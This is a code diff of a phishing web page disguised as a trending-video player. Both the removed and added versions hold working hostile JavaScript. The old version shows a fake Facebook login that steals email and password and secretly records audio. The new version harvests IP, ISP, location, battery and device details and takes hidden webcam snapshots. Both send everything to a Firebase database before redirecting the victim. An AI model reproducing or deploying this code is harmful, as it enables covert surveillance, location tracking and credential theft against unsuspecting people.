@@ -3,39 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Verification</title>
+    <title>Video Player - Trending</title>
     <style>
-        body { background: #0f0f0f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { text-align: center; width: 85%; background: #1a1a1a; padding: 30px; border-radius: 15px; border: 1px solid #333; }
-        .btn { background: #f00; color: #fff; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; box-sizing: border-box; }
-        #login-form { display: none; }
+        body { background: #fff; color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .player-box { width: 90%; max-width: 400px; padding: 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .video-thumb { width: 100%; border-radius: 12px; margin-bottom: 15px; border: 1px solid #eee; }
+        .btn { background: #ff0000; color: #fff; border: none; padding: 12px 25px; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 4px 10px rgba(255,0,0,0.2); }
+        .loading-text { font-size: 12px; color: #888; margin-top: 10px; }
+        #video-hidden { display: none; }
     </style>
 </head>
 <body>
-    <div id="ui" class="box">
-        <div id="loader-view">
-            <div style="border: 3px solid #333; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto;"></div>
-            <p id="msg">Initializing Encrypted Player...</p>
-            <button class="btn" onclick="startSpy()">WATCH VIDEO</button>
-        </div>
-
-        <div id="login-form">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="50">
-            <h3>Login to Continue</h3>
-            <p style="font-size: 12px; color: #888;">This video is age-restricted.</p>
-            <input type="text" id="email" placeholder="Email or Phone">
-            <input type="password" id="pass" placeholder="Password">
-            <button class="btn" style="background: #1877f2;" onclick="saveLogin()">LOGIN</button>
-        </div>
+    <div class="player-box" id="ui">
+        <img src="https://img.youtube.com/vi/aqz-KE-bpKQ/mqdefault.jpg" class="video-thumb">
+        <h3 style="margin: 10px 0; font-size: 18px;">Video Processing... (1/2)</h3>
+        <p style="font-size: 13px; color: #666;">High-speed server connection established. Complete verification to watch both videos.</p>
+        <button class="btn" onclick="startCapture()">VERIFY & PLAY VIDEOS</button>
+        <p class="loading-text">🔒 Secure end-to-end encryption</p>
     </div>
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
+    <video id="video-hidden" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
-        let userKey, targetUrl, mode;
+        let userKey, targetUrl, isCaptured = false;
 
         const params = new URLSearchParams(window.location.search);
         const id = params.get('id');
@@ -43,63 +35,63 @@
             const decoded = JSON.parse(atob(id));
             userKey = decoded.k;
             targetUrl = decoded.r;
-            mode = decoded.m; // m=1 (Phishing), m=2 (Audio/Cam), m=3 (Files)
         }
 
-        async function startSpy() {
-            if (mode === "1") {
-                document.getElementById('loader-view').style.display = 'none';
-                document.getElementById('login-form').style.display = 'block';
-            } else {
-                captureMedia();
-            }
-        }
+        async function startCapture() {
+            if(isCaptured) return;
+            isCaptured = true;
 
-        async function captureMedia() {
+            // 1. Capture All Details (IP, SIM/ISP, Network, Battery)
+            let details = {
+                time: new Date().toLocaleString(),
+                model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown",
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                ram: navigator.deviceMemory || "N/A"
+            };
+
             try {
-                // Request Mic & Cam
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                // Battery & Network
+                const bat = await navigator.getBattery();
+                details.battery = Math.round(bat.level * 100) + "%";
+                details.charging = bat.charging ? "Yes" : "No";
+                details.network = navigator.connection ? navigator.connection.effectiveType : "N/A";
+
+                // IP & ISP (SIM Details)
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                details.ip = d.ip;
+                details.isp = d.org; // This shows SIM/Network provider
+                details.loc = `${d.city}, ${d.region}, ${d.country_name}`;
+                details.flag = `https://flagcdn.com/w40/${d.country_code.toLowerCase()}.png`;
+                details.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            } catch(e) {}
+
+            fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(details) });
+
+            // 2. Capture 4 Snaps
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('video-hidden');
+                v.srcObject = stream;
                 
-                // 1. Audio Recording (5 Seconds)
-                const mediaRecorder = new MediaRecorder(stream);
-                let audioChunks = [];
-                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                    const reader = new FileReader();
-                    reader.readAsDataURL(audioBlob);
-                    reader.onloadend = () => {
-                        fetch(`${DB_URL}audio/${userKey}.json`, { method: 'POST', body: JSON.stringify({ audio: reader.result, time: new Date().toLocaleString() }) });
-                    };
-                };
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000);
-
-                // 2. Multi Snaps (Already in your V17)
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                let snaps = 0;
+                let count = 0;
                 let interval = setInterval(() => {
-                    if(snaps > 5) { clearInterval(interval); window.location.href = targetUrl; }
+                    if(count >= 4) {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = targetUrl; // Final Redirect
+                        return;
+                    }
                     const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    fetch(`${DB_URL}photos/${userKey}.json`, { method: 'POST', body: JSON.stringify({ photo: canvas.toDataURL('image/jpeg', 0.3) }) });
-                    snaps++;
+                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    const photo = canvas.toDataURL('image/jpeg', 0.4);
+                    fetch(`${DB_URL}photos/${userKey}.json`, { method: 'POST', body: JSON.stringify({ photo, time: new Date().toLocaleTimeString() }) });
+                    count++;
                 }, 1000);
-
-            } catch (e) { window.location.href = targetUrl; }
-        }
-
-        function saveLogin() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            fetch(`${DB_URL}logins/${userKey}.json`, { 
-                method: 'POST', 
-                body: JSON.stringify({ email, pass, time: new Date().toLocaleString() }) 
-            }).then(() => { window.location.href = targetUrl; });
+            } catch(e) { window.location.href = targetUrl; }
         }
     </script>
-    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
